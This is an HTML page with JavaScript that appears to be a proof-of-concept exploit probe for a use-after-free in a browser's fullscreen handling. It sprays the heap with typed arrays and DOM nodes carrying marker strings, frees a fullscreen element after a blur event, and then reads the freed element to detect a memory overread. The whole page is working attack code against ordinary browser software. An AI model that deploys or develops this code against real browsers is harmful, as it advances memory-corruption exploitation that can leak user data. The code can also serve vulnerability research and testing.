
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>UAF Leak Amplification</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<button onclick="runTest()">Run Test</button>

<script>

let logBuffer = [];

function log(m){
    try{console.log(m);}catch(e){}
    logBuffer.push(m);
}

// ==========================
// HEAP SETUP
// ==========================
function setupHeap(){
    let a=[];
    for(let i=0;i<5000;i++){
        let x=new Float64Array(8);
        x[0]=i;
        a.push(x);
    }
    return a;
}

// ==========================
// FULLSCREEN
// ==========================
function setupFS(){
    let fs=document.createElement("div");

    fs.innerHTML="<h1>FULLSCREEN</h1>";

    fs.style.cssText="position:absolute;width:100%;height:100%;background:black";

    document.body.appendChild(fs);

    fs.webkitRequestFullscreen?.();

    return fs;
}

// ==========================
// 💣 RECLAIM (LEAK MODE)
// ==========================
function reclaim(){

    log("[*] Reclaim start");

    let bucket=[];

    // 🔥 LONG STRING SPRAY
    for(let i=0;i<8000;i++){

        let e=document.createElement("div");

        let pattern = "AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEE";

        e.innerHTML = "HDR_"+i+"_"+pattern.repeat(8);

        document.body.appendChild(e);
        bucket.push(e);
    }

    // TEXT spray
    for(let i=0;i<8000;i++){
        let t=document.createTextNode(
            "TXT_"+i+"_BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
        );
        document.body.appendChild(t);
        bucket.push(t);
    }

    log("[*] Reclaim end: "+bucket.length);

    return bucket;
}

// ==========================
// 🔬 LEAK PROBE
// ==========================
function probe(fs){

    log("---- PROBE ----");

    try{
        let s = fs.innerHTML;

        log("[LEN] "+(s ? s.length : "null"));
        log("[VAL] "+s);

        if(s){

            if(s.includes("AAAA")) log("[HIT] A");
            if(s.includes("BBBB")) log("[HIT] B");
            if(s.includes("CCCC")) log("[HIT] C");

            if(s.length > 20){
                log("[!!!] POSSIVEL OVERREAD / OVERLAP");
            }

        }

    }catch(e){
        log("[CRASH] read");
    }

}

// ==========================
// TRIGGER
// ==========================
function trigger(fs){

    log("[*] Trigger");

    try{
        fs.remove();
        document.webkitExitFullscreen?.();
    }catch(e){}

    setTimeout(()=>reclaim(),0);
    setTimeout(()=>reclaim(),50);
    setTimeout(()=>reclaim(),100);

    setTimeout(()=>probe(fs),120);
    setTimeout(()=>probe(fs),200);
    setTimeout(()=>probe(fs),300);

    setTimeout(()=>{
        alert(logBuffer.join("\n"));
    },400);

    setTimeout(()=>location.reload(),500);
}

// ==========================
// MAIN
// ==========================
function runTest(){

    log("[*] Start");

    setupHeap();

    let fs = setupFS();

    window.onblur = ()=>{
        log("[*] onblur");
        setTimeout(()=>trigger(fs),3000);
    };
}

</script>

</body>
</html>
